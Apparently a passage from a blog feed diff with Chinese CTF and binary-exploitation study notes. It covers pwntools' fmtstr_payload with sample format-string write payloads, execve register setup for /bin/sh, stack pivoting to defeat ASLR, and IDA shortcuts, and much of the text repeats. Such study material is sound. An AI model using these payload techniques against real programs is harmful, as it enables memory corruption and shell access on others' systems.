href="https://docs.python.org/3.8/library/functions.html#int"><em>int</em></a>) – number of byte already written by the printf function<br><strong>write_size</strong> (<a href="https://docs.python.org/3.8/library/stdtypes.html#str"><em>str</em></a>) – must be <code>byte</code>, <code>short</code> or <code>int</code>. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)`<br><strong>overflows</strong> (<a href="https://docs.python.org/3.8/library/functions.html#int"><em>int</em></a>) – how many extra overflows (at size sz) to tolerate to reduce the length of the format string<br><strong>strategy</strong> (<a href="https://docs.python.org/3.8/library/stdtypes.html#str"><em>str</em></a>) – either ‘fast’ or ‘small’ (‘small’ is default, ‘fast’ can be used if there are many writes)<br> Returns:    The payload in order to do needed writes                     </p><p><strong>Examples</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">&gt;&gt;&gt; context.clear(arch = 'amd64')&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int')b'%322419390c%4$llnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00'&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short')b'%47806c%5$lln%22649c%6$hnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00'&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte')b'%190c%7$lln%85c%8$hhn%36c%9$hhn%131c%10$hhnaaaab\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'&gt;&gt;&gt; context.clear(arch = 'i386')&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int')b'%322419390c%5$na\x00\x00\x00\x00'&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short')b'%4919c%7$hn%42887c%8$hna\x02\x00\x00\x00\x00\x00\x00\x00'&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte')b'%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x00000001}, write_size='byte')b'%1c%3$na\x00\x00\x00\x00'&gt;&gt;&gt; fmtstr_payload(1, {0x0: b"\xff\xff\x04\x11\x00\x00\x00\x00"}, write_size='short')b'%327679c%7$lln%18c%8$hhn\x00\x00\x00\x00\x03\x00\x00\x00'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-scanf函数"><a href="#3-scanf函数" class="headerlink" title="3. scanf函数"></a>3. scanf函数</h3><ul><li><p>功能:通过键盘给程序中的变量赋值</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;int scanf(const char *format,...)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>scanf(“输入控制符”,输入参数);</p><p>功能:将从键盘输入的字符转化为”输入控制符”所规定格式的数据,然后存入以输入参数的值为地址的变量中.</p></li></ul><h3 id="4-sys-execve系统调用"><a href="#4-sys-execve系统调用" class="headerlink" title="4.sys_execve系统调用"></a>4.sys_execve系统调用</h3><ul><li>这个系统调用需要设置5个寄存器<ul><li>eax = 11= 0xb</li><li>ebx = &amp;(“/bin/sh”)</li><li>ecx = edx = edi = 0</li></ul></li></ul><h3 id="5-stack-pivot"><a href="#5-stack-pivot" class="headerlink" title="5.stack pivot"></a>5.stack pivot</h3><ul><li>stack pivot 这种技术是一个对抗ASLR的利器.</li><li>stack pivot之所以重要,是因为其利用到的gadget几乎不可能找不到.在函数建立栈帧时有两条指令push ebp;mov ebp,esp,而退出时同样需要消除这两条指令的影响,即leave(mov esp,ebp;pop ebp).且leave一般紧跟着就是ret.因此,在存在栈溢出的程序中,只要我们能控制到栈中的ebp,我们就可以通过两次leave劫持栈.</li></ul>]]></content>
+        <content type="html"><![CDATA[<h3 id="1-flat-args-preprocessor-None-length-None-filler-de-bruijn"><a href="#1-flat-args-preprocessor-None-length-None-filler-de-bruijn" class="headerlink" title="1. flat(*args, preprocessor = None, length = None, filler = de_bruijn(),"></a><strong>1. flat(*args, preprocessor = None, length = None, filler = de_bruijn(),</strong></h3><p>Flattens the arguments into a string.</p><p>This function takes an arbitrary number of arbitrarily nested lists, tuples and dictionaries. It will then find every string and number inside those and flatten them out. Strings are inserted directly while numbers are packed using the <a href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.pack"><code>pack()</code></a> function. Unicode strings are UTF-8 encoded.</p><p>Dictionary keys give offsets at which to place the corresponding values (which are recursively flattened). Offsets are relative to where the flattened dictionary occurs in the output (i.e. <code>{0: 'foo'}</code> is equivalent to <code>'foo'</code>). Offsets can be integers, unicode strings or regular strings. Integer offsets &gt;= <code>2**(word_size-8)</code> are converted to a string using <a href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.pack"><code>pack()</code></a>. Unicode strings are UTF-8 encoded. After these conversions offsets are either integers or strings. In the latter case, the offset will be the lowest index at which the string occurs in filler. See examples below.</p><h3 id="2-fmtstr-payload"><a href="#2-fmtstr-payload" class="headerlink" title="2. fmtstr_payload()"></a>2. fmtstr_payload()</h3><p><strong>fmtstr_payload</strong>是pwntools里面的一个工具,用来简化对格式化字符串漏洞的构造工作.可以实现修改任意内存.</p><p>fmtstr_payload(偏移,{源地址,目的地址})</p><blockquote><p><strong>fmtstr_payload(offset,writes,numbwritten=0,write_size=’byte’)</strong></p></blockquote><blockquote><ul><li>第一个参数表示格式化字符串的偏移;</li><li>第二个参数表示需要利用%n写入的数据,采用字典形式</li><li>第三个参数表示已经输出的字符的个数,默认为0</li><li>第四个参数表=表示写入方式,是按字节(byte),双字节(short),四字节(int),分别对应hhn,hn,n,默认值为hhn.</li><li>返回值就是payload</li></ul></blockquote><p>  常用形式: fmtstr_payload(offset,{key:value})</p><p>  <strong>以下为pwnlib中的解释</strong>: <a href="https://docs.pwntools.com/en/stable/fmtstr.html">fmtstr_payload</a></p><p>  <code>pwnlib.fmtstr.fmtstr_payload</code><strong>(<em><strong>offset</strong></em>,</strong> <em>writes</em><strong>,</strong> <em>numbwritten=0</em><strong>,</strong> <em>write_size=’byte’</em><strong>)</strong> <strong>→ str</strong>[<a href="https://github.com/Gallopsled/pwntools/blob/67b28491a4/pwnlib/fmtstr.py#L759-L814">source</a>]</p><p>  Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. The size of the addr is taken from <code>context.bits</code></p><p>  The overflows argument is a format-string-length to output-amount tradeoff: Larger values for <code>overflows</code> produce shorter format strings that generate more output at runtime.</p><p>Parameters:<br><strong>offset</strong> (<a href="https://docs.python.org/3.8/library/functions.html#int"><em>int</em></a>) – the first formatter’s offset you control<br><strong>writes</strong> (<a href="https://docs.python.org/3.8/library/stdtypes.html#dict"><em>dict</em></a>) – dict with addr, value <code>{addr: value, addr2: value2}</code><br><strong>numbwritten</strong> (<a href="https://docs.python.org/3.8/library/functions.html#int"><em>int</em></a>) – number of byte already written by the printf function<br><strong>write_size</strong> (<a href="https://docs.python.org/3.8/library/stdtypes.html#str"><em>str</em></a>) – must be <code>byte</code>, <code>short</code> or <code>int</code>. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)`<br><strong>overflows</strong> (<a href="https://docs.python.org/3.8/library/functions.html#int"><em>int</em></a>) – how many extra overflows (at size sz) to tolerate to reduce the length of the format string<br><strong>strategy</strong> (<a href="https://docs.python.org/3.8/library/stdtypes.html#str"><em>str</em></a>) – either ‘fast’ or ‘small’ (‘small’ is default, ‘fast’ can be used if there are many writes)<br> Returns:    The payload in order to do needed writes                     </p><p><strong>Examples</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">&gt;&gt;&gt; context.clear(arch = 'amd64')&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int')b'%322419390c%4$llnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00'&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short')b'%47806c%5$lln%22649c%6$hnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00'&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte')b'%190c%7$lln%85c%8$hhn%36c%9$hhn%131c%10$hhnaaaab\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'&gt;&gt;&gt; context.clear(arch = 'i386')&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x1337babe}, write_size='int')b'%322419390c%5$na\x00\x00\x00\x00'&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x1337babe}, write_size='short')b'%4919c%7$hn%42887c%8$hna\x02\x00\x00\x00\x00\x00\x00\x00'&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x1337babe}, write_size='byte')b'%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00'&gt;&gt;&gt; fmtstr_payload(1, {0x0: 0x00000001}, write_size='byte')b'%1c%3$na\x00\x00\x00\x00'&gt;&gt;&gt; fmtstr_payload(1, {0x0: b"\xff\xff\x04\x11\x00\x00\x00\x00"}, write_size='short')b'%327679c%7$lln%18c%8$hhn\x00\x00\x00\x00\x03\x00\x00\x00'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-scanf函数"><a href="#3-scanf函数" class="headerlink" title="3. scanf函数"></a>3. scanf函数</h3><ul><li><p>功能:通过键盘给程序中的变量赋值</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;int scanf(const char *format,...)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>scanf(“输入控制符”,输入参数);</p><p>功能:将从键盘输入的字符转化为”输入控制符”所规定格式的数据,然后存入以输入参数的值为地址的变量中.</p></li></ul><h3 id="4-sys-execve系统调用"><a href="#4-sys-execve系统调用" class="headerlink" title="4.sys_execve系统调用"></a>4.sys_execve系统调用</h3><ul><li>这个系统调用需要设置5个寄存器<ul><li>eax = 11= 0xb</li><li>ebx = &amp;(“/bin/sh”)</li><li>ecx = edx = edi = 0</li></ul></li></ul><h3 id="5-stack-pivot"><a href="#5-stack-pivot" class="headerlink" title="5.stack pivot"></a>5.stack pivot</h3><ul><li>stack pivot 这种技术是一个对抗ASLR的利器.</li><li>stack pivot之所以重要,是因为其利用到的gadget几乎不可能找不到.在函数建立栈帧时有两条指令push ebp;mov ebp,esp,而退出时同样需要消除这两条指令的影响,即leave(mov esp,ebp;pop ebp).且leave一般紧跟着就是ret.因此,在存在栈溢出的程序中,只要我们能控制到栈中的ebp,我们就可以通过两次leave劫持栈.</li></ul><h3 id="6-IDA常用快捷键"><a href="#6-IDA常用快捷键" class="headerlink" title="6.IDA常用快捷键"></a>6.IDA常用快捷键</h3><ul><li>a: 将数据转换为字符串</li><li>d: 将代码转换成数据</li><li>c: 将数据转换为代码</li><li>esc: 回退键,能够倒回上一步操作的视图(只有在反汇编窗口才是这个作用,如果是在其他窗口按下esc,会关闭该窗口)</li><li>shift+f12: 可以打开string窗口,一键找出所有的字符串,右击setup,还能对窗口的属性进行设置</li><li>ctrl+w: 保存ida数据库</li><li>ctrl+s: 选择某个数据段,直接俄进行跳转</li><li>ctrl+鼠标滚轮: 能够调节流程试图的大小</li><li>x: 对着某个函数\变量按该快捷键,可以查看它的交叉引用</li><li>g: 直接跳转到某个地址</li><li>n: 更改变量的名称</li><li>y: 更改变量的类型</li><li>/: 在反编译后伪代码界面中写下注释</li><li>: 在反编译后伪代码的界面中隐藏/显示变量和函数的类型描述,有时候变量特别多的时候隐藏掉类型描述看起来会轻松很多</li><li>; : 在反汇编后的界面下写下注释</li><li>ctrl+shift+w: 拍摄IDA快照</li><li>u: undefine,取消函数,代码,数据的定义.</li></ul>]]></content>
       
       
       <categories>
